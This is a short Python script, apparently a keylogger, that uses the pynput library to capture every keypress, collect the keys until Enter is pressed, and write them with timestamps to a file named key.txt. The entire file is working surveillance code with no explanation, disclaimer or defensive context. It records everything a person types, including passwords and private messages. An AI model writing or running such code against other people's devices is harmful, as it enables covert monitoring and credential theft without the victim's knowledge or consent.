from pynput.keyboard import Key,Listener
import logging
logging.basicConfig(filename = "key.txt",level=logging.DEBUG, format = "%(asctime)s,%(msg)s")
mass_ = []
def on_press(key):
	global mass_

	
	if key == Key.enter:
		logging.info(str(mass_))
		mass_ = []
	else: mass_.append(key)


with Listener(on_press=on_press) as listener:
	listener.join()


